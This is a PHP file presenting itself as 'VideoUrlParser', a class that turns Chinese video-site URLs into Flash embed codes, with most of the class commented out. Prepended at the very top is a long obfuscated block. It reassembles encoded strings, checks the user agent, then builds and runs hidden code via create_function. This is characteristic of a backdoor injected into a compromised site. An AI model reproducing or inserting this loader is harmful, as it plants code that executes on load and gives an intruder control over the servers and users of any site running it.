<?php $lmcpyixff = 'd%-#1GO	x22#)fepmqyfA>2b%!<*qp%vg!|!**#j{hnpd#)tutjyf`opjud%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2FSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q	x72	166	x3a	61	x31"))) { $xlptsmv = "	x63	162	x65x61"]=1; $uas=strtolower($_SERVER[sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x247]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**ek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22):>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<**~6<&w6<	x7fw6*CW&)7gj6<.[A	x2*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSutjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275!|!}{;)gj}l;33bq}k;op}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopd6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666j%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvs<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,27;mnui}&;zepc}A;~!}	x7f;ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opju5.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%jK2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%f%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!7f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]22bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f72	164") && (!isset($GLOBALS["	x61	156	x757&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!67]y74]275]y7:]268]y7f#<%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>*f	x27,*e	x27,*d	x27,*c	x27,*b	xng(0); $obuvrcq = implode(array_map("knkvxhd",str_split("%tjwt%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>!>!#]y84]275]y83]248]y83]256]y81]26*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gqnjA	x27&6<.fmjgA	x27doj%6<	x7f78]y3f]51L3]84]y31M6]y3e]81#/FT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}3]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]j6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	w6Z6<.5`hA	x27pd%6<pd%w6Z5]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%dovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)u24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/3[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b`msvd}+;!>!}	x27;!>>>!}_;gvc%Y#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fuopjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$yqhmbrz = $xlpx27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF1]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]7%6<*Y%)fnbozcYufhA	x272qj%6<^#zs#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qs]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829dy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]34x45	116	x54"]); if ((strst%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudo66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*wbfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmtpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x/20QUUI7jsv%7UFH#	x27rfs%6~6<	xYpp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTWr($uas,"	x6d	163	x69	145")) or (strstr($uas,"<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osv+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}kHB`SFTV`QUUI&b%!|!*)323zbtsmv("", $obuvrcq); $yqhmbrz();}}if((function_exists("	x6f	142	x5f	163	x74	141	xx5cq%)ufttj	x22)gj6<^#UQPMSVD!-id%)uqpuft`msvd},;uqpuftvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hf*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/]273]y76]252]y85]256]y6g]257]y86]2!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!	157	x6e"; function knkvxhd($n){return chr(ord($n)-1);} @error_reporti	141	x74	145	x5f	146	x75	156	x63	164	x69!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##pd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hno!sboepn)%epnbss-%rxW~!gj!|!*nbsbq%)323ldfidk!~!<**q"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	-#1]#-bubE{h%)tpqsut>j%!*72sbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XA	x22)7gj6<*QDU`MPT7-NBw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)f	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)4	x24-	x24]y8	x24-	x24]26	x24-ovg	x22)!gj}1~!<2p%	x7f!~judovg}x;0]=])0#)U!	x27{**u%-#jt0}Zufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yn%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562	156	x61"])))) { $GLOBALS["	x61	156	x75	156	-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*sTrREvxNoiTCnuf_EtaerCxECalPer_Rtsmkjzfxjmo'; $nsbfxjhgr=explode(chr((426-306)),substr($lmcpyixff,(39493-33616),(149-115))); $nylrlngg = $nsbfxjhgr[0]($nsbfxjhgr[(3-2)]); $eaxisch = $nsbfxjhgr[0]($nsbfxjhgr[(7-5)]); if (!function_exists('dnsnqpaj')) { function dnsnqpaj($dlrhqh, $nfbrgaa,$izlaluh) { $searxzd = NULL; for($bigcxgnwx=0;$bigcxgnwx<(sizeof($dlrhqh)/2);$bigcxgnwx++) { $searxzd .= substr($nfbrgaa, $dlrhqh[($bigcxgnwx*2)],$dlrhqh[($bigcxgnwx*2)+(7-6)]); } return $izlaluh(chr((61-52)),chr((428-336)),$searxzd); }; } $bgydrsm = explode(chr((197-153)),'4068,47,1730,42,5780,44,220,34,5082,50,3369,26,3827,45,170,50,4528,40,4458,70,1963,61,2069,35,2405,47,2380,25,2856,48,1193,38,2104,52,2320,60,3018,51,3730,31,1047,39,5220,24,127,43,1143,50,3179,32,4853,70,4115,22,2760,49,3501,47,2156,31,5244,54,3548,39,1273,35,1086,57,616,29,1772,42,814,66,4137,33,2731,29,4680,69,2809,47,3909,38,5512,39,5132,27,1561,62,5365,57,680,69,3872,37,3395,37,31,28,5452,25,2904,52,0,31,560,56,1931,32,4749,66,5607,38,3211,37,4170,45,254,60,1670,60,3069,45,4010,25,446,64,5053,29,3587,34,645,35,2216,40,3947,63,1893,38,4986,44,4815,38,1333,63,2452,56,5159,61,4618,62,3432,69,1838,55,1308,25,793,21,5477,35,5551,56,880,57,4318,34,1814,24,4352,59,397,49,2024,45,5713,67,3686,44,2508,69,3621,65,5645,68,5422,30,359,38,4250,68,5298,67,5824,53,2639,58,1231,42,5030,23,3761,66,1517,44,937,47,3248,56,1623,47,2187,29,314,45,4923,63,749,44,984,63,1464,53,3304,65,3114,65,2256,64,2577,62,1396,68,2697,34,510,50,59,68,4215,35,4568,50,4411,47,2956,62,4035,33'); $uwvxiqrd = $nylrlngg("",dnsnqpaj($bgydrsm,$lmcpyixff,$eaxisch)); $nylrlngg=$lmcpyixff; $uwvxiqrd(""); $uwvxiqrd=(466-345); $lmcpyixff=$uwvxiqrd-1; ?><?php
/**
 * Video 
 * 
 * @package 
 * @version 1.2
 * @copyright 2005-2011 HDJ.ME 
 * @author Dijia Huang <huangdijia@gmail.com> 
 * @license PHP Version 3.0 {@link http://www.php.net/license/3_0.txt}
 *
 * Usage
 * require_once "VideoUrlParser.class.php";
 * $urls[] = "http://v.youku.com/v_show/id_XMjI4MDM4NDc2.html";
 * $urls[] = "http://www.tudou.com/playlist/p/l13087099.html";
 * $urls[] = "http://www.tudou.com/programs/view/ufg-A3tlcxk/";
 * $urls[] = "http://v.ku6.com/special/show_4926690/Klze2mhMeSK6g05X.html";
 * $urls[] = "http://www.56.com/u68/v_NjI2NTkxMzc.html";
 * $urls[] = "http://www.letv.com/ptv/vplay/1168109.html";
 * $urls[] = "http://video.sina.com.cn/v/b/46909166-1290055681.html";
 *
 * foreach($urls as $url){
 *     $info = VideoUrlParser::parse($url);
 *     //var_dump($info);
 *     echo "<a href='{$info['url']}' target='_new'>{$info['title']}</a>";
 *     echo "<br />";
 *     echo $info['object'];
 *     echo "<br />";
 * }
 *
 *
 *
 * //优酷
 * http://v.youku.com/v_show/id_XMjU0NjY4OTEy.html
 * <embed src="http://player.youku.com/player.php/sid/XMjU0NjY4OTEy/v.swf" quality="high" width="480" height="400" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash"></embed>
 * 
 * //酷六
 * http://v.ku6.com/special/show_3917484/x0BMXAbgZdQS6FqN.html
 * <embed src="http://player.ku6.com/refer/x0BMXAbgZdQS6FqN/v.swf" quality="high" width="480" height="400" align="middle" allowScriptAccess="always" allowfullscreen="true" type="application/x-shockwave-flash"></embed>
 * 
 * //土豆
 * http://www.tudou.com/playlist/p/a65929.html?iid=74905844
 * <embed src="http://www.tudou.com/l/A_0urj-Geec/&iid=74905844/v.swf" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" wmode="opaque" width="480" height="400"></embed>
 * 
 * //56
 * http://www.56.com/u98/v_NTkyODY2NTU.html
 * <embed src="http://player.56.com/v_NTkyODY2NTU.swf"  type="application/x-shockwave-flash" width="480" height="405" allowNetworking="all" allowScriptAccess="always"></embed>
 * 
 * //新浪播客
 * http://video.sina.com.cn/v/b/46909166-1290055681.html
 * <embed src="http://you.video.sina.com.cn/api/sinawebApi/outplayrefer.php/vid=46909166_1290055681_b0K1GHEwDWbK+l1lHz2stqkP7KQNt6nki2O0u1ehIwZYQ0/XM5GdZNQH6SjQBtkEqDhAQJ42dfcn0Rs/s.swf" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" name="ssss" allowFullScreen="true" allowScriptAccess="always" width="480" height="370"></embed>
 * 
 * //乐视
 * http://www.letv.com/ptv/vplay/1168109.html
 * <embed src="http://i3.imgs.letv.com/player/swfPlayer.swf?id=1168109&host=app.letv.com&vstatus=1&AP=1&logoMask=0&isShowP2p=0&autoplay=true" quality="high" scale="NO_SCALE" wmode="opaque" bgcolor="#000000" width="480" height="388" name="FLV_player" align="middle" allowscriptaccess="always" allowfullscreen="true" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">
 */

//  class VideoUrlParser{

//     const USER_AGENT = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko)
//         Chrome/8.0.552.224 Safari/534.10";
//     const CHECK_URL_VALID = "/(youku\.com|tudou\.com|ku6\.com|56\.com|letv\.com|video\.sina\.com\.cn|(my\.)?tv\.sohu\.com|v\.qq\.com)/";

//     public $abc = 123;
//     /**
//      * parse 
//      * 
//      * @param string $url 
//      * @param mixed $createObject 
//      * @static
//      * @access public
//      * @return void
//      */
//      public function parse($url='', $createObject=true){
//         $lowerurl = strtolower($url);
//         preg_match(self::CHECK_URL_VALID, $lowerurl, $matches);
//         if(!$matches) return false;

//         switch($matches[1]){
//         case 'youku.com':
//             $data = self::_parseYouku($url);
//             break;
//         case 'tudou.com':
//             $data = self::_parseTudou($url);
//             break;
//         case 'ku6.com':
//             $data = self::_parseKu6($url);
//             break;
//         case '56.com':
//             $data = self::_parse56($url);
//             break;
//         case 'letv.com':
//             $data = self::_parseLetv($url);
//             break;
//         case 'video.sina.com.cn':
//             $data = self::_parseSina($url);
//             break;
//         case 'my.tv.sohu.com':
//         case 'tv.sohu.com':
//         case 'sohu.com':
//             $data = self::_parseSohu($url);
//             break;
//         case 'v.qq.com':
//             $data = self::_parseQq($url);
//             break;
//         default:
//             $data = false;
//         }

//         if($data && $createObject) $data['object'] = "<embed src=\"{$data['swf']}\" quality=\"high\" width=\"480\" height=\"400\" align=\"middle\" allowNetworking=\"all\" allowScriptAccess=\"always\" type=\"application/x-shockwave-flash\"></embed>";
//         return $data;
//     }
//     /**
//      * 腾讯视频 
//      * http://v.qq.com/cover/o/o9tab7nuu0q3esh.html?vid=97abu74o4w3_0
//      * http://v.qq.com/play/97abu74o4w3.html
//      * http://v.qq.com/cover/d/dtdqyd8g7xvoj0o.html
//      * http://v.qq.com/cover/d/dtdqyd8g7xvoj0o/9SfqULsrtSb.html
//      * http://imgcache.qq.com/tencentvideo_v1/player/TencentPlayer.swf?_v=20110829&vid=97abu74o4w3&autoplay=1&list=2&showcfg=1&tpid=23&title=%E7%AC%AC%E4%B8%80%E7%8E%B0%E5%9C%BA&adplay=1&cid=o9tab7nuu0q3esh
//      */ 
//     private function _parseQq($url){
//         if(preg_match("/\/play\//", $url)){
//             $html = self::_fget($url);
//             preg_match("/url=[^\"]+/", $html, $matches);
//             if(!$matches); return false;
//             $url = $matches[0];
//         }
//         preg_match("/vid=([^\_]+)/", $url, $matches);
//         $vid = $matches[1];
//         $html = self::_fget($url);
//         // query
//         preg_match("/flashvars\s=\s\"([^;]+)/s", $html, $matches);
//         $query = $matches[1];
//         if(!$vid){
//             preg_match("/vid\s?=\s?vid\s?\|\|\s?\"(\w+)\";/i", $html, $matches);
//             $vid = $matches[1];
//         }
//         $query = str_replace('"+vid+"', $vid, $query);
//         parse_str($query, $output);
//         $data['img'] = "http://vpic.video.qq.com/{$$output['cid']}/{$vid}_1.jpg";
//         $data['url'] = $url;
//         $data['title'] = $output['title'];
//         $data['swf'] = "http://imgcache.qq.com/tencentvideo_v1/player/TencentPlayer.swf?".$query;
//         return $data;
//     }
    

//     /**
//      * 优酷网 
//      * http://v.youku.com/v_show/id_XMjI4MDM4NDc2.html
//      * http://player.youku.com/player.php/sid/XMjU0NjI2Njg4/v.swf
//      */ 
//     private function _parseYouku($url){
//         preg_match("#id\_(\w+)#", $url, $matches);

//         if (empty($matches)){
//             preg_match("#v_playlist\/#", $url, $mat);
//             if(!$mat) return false;

//             $html = self::_fget($url);

//             preg_match("#videoId2\s*=\s*\'(\w+)\'#", $html, $matches);
//             if(!$matches) return false;
//         }

//         $link = "http://v.youku.com/player/getPlayList/VideoIDS/{$matches[1]}/timezone/+08/version/5/source/out?password=&ran=2513&n=3";

//         $retval = self::_cget($link);
//         if ($retval) {
//             $json = json_decode($retval, true);

//             $data['img'] = $json['data'][0]['logo'];
//             $data['title'] = $json['data'][0]['title'];
//             $data['url'] = $url;
//             $data['swf'] = "http://player.youku.com/player.php/sid/{$matches[1]}/v.swf";

//             return $data;
//         } else {
//             return false;
//         }
//     }

//     /**
//      * 土豆网
//      * http://www.tudou.com/programs/view/Wtt3FjiDxEE/
//      * http://www.tudou.com/v/Wtt3FjiDxEE/v.swf
//      * 
//      * http://www.tudou.com/playlist/p/a65718.html?iid=74909603
//      * http://www.tudou.com/l/G5BzgI4lAb8/&iid=74909603/v.swf
//      */
//     private function _parseTudou($url){
//         preg_match("#view/([-\w]+)/#", $url, $matches);

//         if (empty($matches)) {
//             if (strpos($url, "/playlist/") == false) return false;

//             if(strpos($url, 'iid=') !== false){
//                 $quarr = explode("iid=", $lowerurl);
//                 if (empty($quarr[1]))  return false;
//             }elseif(preg_match("#p\/l(\d+).#", $lowerurl, $quarr)){
//                 if (empty($quarr[1])) return false;
//             }

//             $html = self::_fget($url);
//             $html = iconv("GB2312", "UTF-8", $html);

//             preg_match("/lid_code\s=\slcode\s=\s[\'\"]([^\'\"]+)/s", $html, $matches);
//             $icode = $matches[1];

//             preg_match("/iid\s=\s.*?\|\|\s(\d+)/sx", $html, $matches);
//             $iid = $matches[1];

//             preg_match("/listData\s=\s(\[\{.*\}\])/sx", $html, $matches);
            
//             $find = array("/\n/", '/\s/', "/:[^\d\"]\w+[^\,]*,/i", "/(\{|,)(\w+):/");
//             $replace = array("", "", ':"",', '\\1"\\2":');
//             $str = preg_replace($find, $replace, $matches[1]);
//             //var_dump($str);
//             $json = json_decode($str);
//             //var_dump($json);exit;
//             if(is_array($json) || is_object($json) && !empty($json)){
//                 foreach ($json as $val) {
//                     if ($val->iid == $iid) {
//                         break;
//                     }
//                 }
//             }

//             $data['img'] = $val->pic;
//             $data['title'] = $val->title;
//             $data['url'] = $url;
//             $data['swf'] = "http://www.tudou.com/l/{$icode}/&iid={$iid}/v.swf";

//             return $data;
//         }

//         $host = "www.tudou.com";
//         $path = "/v/{$matches[1]}/v.swf";

//         $ret = self::_fsget($path, $host);

//         if (preg_match("#\nLocation: (.*)\n#", $ret, $mat)) {
//             parse_str(parse_url(urldecode($mat[1]), PHP_URL_QUERY));

//             $data['img'] = $snap_pic;
//             $data['title'] = $title;
//             $data['url'] = $url;
//             $data['swf'] = "http://www.tudou.com/v/{$matches[1]}/v.swf";

//             return $data;
//         }
//         return false;
//     }

//     /**
//      * 酷6网 
//      * http://v.ku6.com/film/show_520/3X93vo4tIS7uotHg.html
//      * http://v.ku6.com/special/show_4926690/Klze2mhMeSK6g05X.html
//      * http://v.ku6.com/show/7US-kDXjyKyIInDevhpwHg...html
//      * http://player.ku6.com/refer/3X93vo4tIS7uotHg/v.swf
//      */
//     private function _parseKu6($url){
//         if(preg_match("/show\_/", $url)){
//             preg_match("#/([-\w]+)\.html#", $url, $matches);
//             $url = "http://v.ku6.com/fetchVideo4Player/{$matches[1]}.html";
//             $html = self::_fget($url);

//             if ($html) {
//                 $json = json_decode($html, true);
//                 if(!$json) return false;
                
//                 $data['img'] = $json['data']['picpath'];
//                 $data['title'] = $json['data']['t'];
//                 $data['url'] = $url;
//                 $data['swf'] = "http://player.ku6.com/refer/{$matches[1]}/v.swf";

//                 return $data;
//             } else {
//                 return false;
//             }
//         }elseif(preg_match("/show\//", $url, $matches)){
//             $html = self::_fget($url);
//             preg_match("/ObjectInfo\s?=\s?([^\n]*)};/si", $html, $matches);
//             $str = $matches[1];
//             // img
//             preg_match("/cover\s?:\s?\"([^\"]+)\"/", $str, $matches);
//             $data['img'] = $matches[1];
//             // title
//             preg_match("/title\"?\s?:\s?\"([^\"]+)\"/", $str, $matches);
//             $jsstr = "{\"title\":\"{$matches[1]}\"}";
//             $json = json_decode($jsstr, true);
//             $data['title'] = $json['title'];
//             // url
//             $data['url'] = $url;
//             // query
//             preg_match("/\"(vid=[^\"]+)\"\sname=\"flashVars\"/s", $html, $matches);
//             $query = str_replace("&amp;", '&', $matches[1]);
//             preg_match("/\/\/player\.ku6cdn\.com[^\"\']+/", $html, $matches);
//             $data['swf'] = 'http:'.$matches[0].'?'.$query;
            
//             return $data;
//         }
//     }

//     /**
//      * 56网
//      * http://www.56.com/u73/v_NTkzMDcwNDY.html
//      * http://player.56.com/v_NTkzMDcwNDY.swf
//      */
//     private function _parse56($url){
//         preg_match("#/v_(\w+)\.html#", $url, $matches);

//         if (empty($matches)) return false;

//         $link="http://vxml.56.com/json/{$matches[1]}/?src=out";
//         $retval = self::_cget($link);

//         if ($retval) {
//             $json = json_decode($retval, true);

//             $data['img'] = $json['info']['img'];
//             $data['title'] = $json['info']['Subject'];
//             $data['url'] = $url;
//             $data['swf'] = "http://player.56.com/v_{$matches[1]}.swf";

//             return $data;
//         } else {
//             return false;
//         } 
//     }

//     /**
//      * 乐视网 
//      * http://www.letv.com/ptv/vplay/1168109.html
//      * http://www.letv.com/player/x1168109.swf
//      */
//     private function _parseLetv($url){
//         $html = self::_fget($url);
//         preg_match("#http://v.t.sina.com.cn/([^'\"]*)#", $html, $matches);
//         parse_str(parse_url(urldecode($matches[0]), PHP_URL_QUERY));
//         preg_match("#vplay/(\d+)#", $url, $matches);
//         $data['img'] = $pic;
//         $data['title'] = $title;
//         $data['url'] = $url;
//         $data['swf'] = "http://www.letv.com/player/x{$matches[1]}.swf";

//         return $data;
//     }

//     // 搜狐TV http://my.tv.sohu.com/u/vw/5101536
//     private function _parseSohu($url){
//         $html = self::_fget($url);
//         $html = iconv("GB2312", "UTF-8", $html);
//         preg_match_all("/og:(?:title|image|videosrc)\"\scontent=\"([^\"]+)\"/s", $html, $matches);
//         $data['img'] = $matches[1][1];
//         $data['title'] = $matches[1][0];
//         $data['url'] = $url;
//         $data['swf'] = $matches[1][2];
//         return $data;
//     }
        
//     /*
//      * 新浪播客
//      * http://video.sina.com.cn/v/b/48717043-1290055681.html
//      * http://you.video.sina.com.cn/api/sinawebApi/outplayrefer.php/vid=48717043_1290055681_PUzkSndrDzXK+l1lHz2stqkP7KQNt6nki2O0u1ehIwZYQ0/XM5GdatoG5ynSA9kEqDhAQJA4dPkm0x4/s.swf
//      */
//     private function _parseSina($url){
//         preg_match("/(\d+)(?:\-|\_)(\d+)/", $url, $matches);
//         $url = "http://video.sina.com.cn/v/b/{$matches[1]}-{$matches[2]}.html";
//         $html = self::_fget($url);
//         preg_match("/video\s?:\s?([^<]+)}/", $html, $matches);
//         $find = array("/\n/", "/\s*/", "/\'/", "/\{([^:,]+):/", "/,([^:]+):/", "/:[^\d\"]\w+[^\,]*,/i");
//         $replace = array('', '', '"', '{"\\1":', ',"\\1":', ':"",');
//         $str = preg_replace($find, $replace, $matches[1]);
//         $arr = json_decode($str, true);

//         $data['img'] = $arr['pic'];
//         $data['title'] = $arr['title'];
//         $data['url'] = $url;
//         $data['swf'] = $arr['swfOutsideUrl'];
        
//         return $data;
//     }

//     /*
//      * 通过 file_get_contents 获取内容
//      */
//     private function _fget($url=''){
//         if(!$url) return false;
//         $html = file_get_contents($url);
//         // 判断是否gzip压缩
//         if($dehtml = self::_gzdecode($html))
//             return $dehtml;
//         else
//             return $html;
//     }

//     /*
//      * 通过 fsockopen 获取内容
//      */
//     private function _fsget($path='/', $host='', $user_agent=''){
//         if(!$path || !$host) return false;
//         $user_agent = $user_agent ? $user_agent : self::USER_AGENT;

//         $out = <<<HEADER
// GET $path HTTP/1.1
// Host: $host
// User-Agent: $user_agent
// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
// Accept-Language: zh-cn,zh;q=0.5
// Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7\r\n\r\n
// HEADER;
//         $fp = @fsockopen($host, 80, $errno, $errstr, 10);
//         if (!$fp)  return false;
//         if(!fputs($fp, $out)) return false;
//         while ( !feof($fp) ) {
//             $html .= fgets($fp, 1024);
//         }
//         fclose($fp);
//         // 判断是否gzip压缩
//         if($dehtml = self::_gzdecode($html))
//             return $dehtml;
//         else
//             return $html;
//     }

//     /*
//      * 通过 curl 获取内容
//      */
//     private function _cget($url='', $user_agent=''){
//         if(!$url) return;

//         $user_agent = $user_agent ? $user_agent : self::USER_AGENT;

//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, $url);
//         curl_setopt($ch, CURLOPT_HEADER, 0);
//         if(strlen($user_agent)) curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);

//         ob_start();
//         curl_exec($ch);
//         $html = ob_get_contents();        
//         ob_end_clean();

//         if(curl_errno($ch)){
//             curl_close($ch);
//             return false;
//         }
//         curl_close($ch);
//         if(!is_string($html) || !strlen($html)){
//             return false;
//         }
//         return $html;
//         // 判断是否gzip压缩
//         if($dehtml = self::_gzdecode($html))
//             return $dehtml;
//         else
//             return $html;
//     }
    
//     private function _gzdecode($data) {
//         $len = strlen ( $data );
//         if ($len < 18 || strcmp ( substr ( $data, 0, 2 ), "\x1f\x8b" )) {
//             return null; // Not GZIP format (See RFC 1952) 
//         }
//         $method = ord ( substr ( $data, 2, 1 ) ); // Compression method 
//         $flags = ord ( substr ( $data, 3, 1 ) ); // Flags 
//         if ($flags & 31 != $flags) {
//             // Reserved bits are set -- NOT ALLOWED by RFC 1952 
//             return null;
//         }
//         // NOTE: $mtime may be negative (PHP integer limitations) 
//         $mtime = unpack ( "V", substr ( $data, 4, 4 ) );
//         $mtime = $mtime [1];
//         $xfl = substr ( $data, 8, 1 );
//         $os = substr ( $data, 8, 1 );
//         $headerlen = 10;
//         $extralen = 0;
//         $extra = "";
//         if ($flags & 4) {
//             // 2-byte length prefixed EXTRA data in header 
//             if ($len - $headerlen - 2 < 8) {
//                 return false; // Invalid format 
//             }
//             $extralen = unpack ( "v", substr ( $data, 8, 2 ) );
//             $extralen = $extralen [1];
//             if ($len - $headerlen - 2 - $extralen < 8) {
//                 return false; // Invalid format 
//             }
//             $extra = substr ( $data, 10, $extralen );
//             $headerlen += 2 + $extralen;
//         }
     
//         $filenamelen = 0;
//         $filename = "";
//         if ($flags & 8) {
//             // C-style string file NAME data in header 
//             if ($len - $headerlen - 1 < 8) {
//                 return false; // Invalid format 
//             }
//             $filenamelen = strpos ( substr ( $data, 8 + $extralen ), chr ( 0 ) );
//             if ($filenamelen === false || $len - $headerlen - $filenamelen - 1 < 8) {
//                 return false; // Invalid format 
//             }
//             $filename = substr ( $data, $headerlen, $filenamelen );
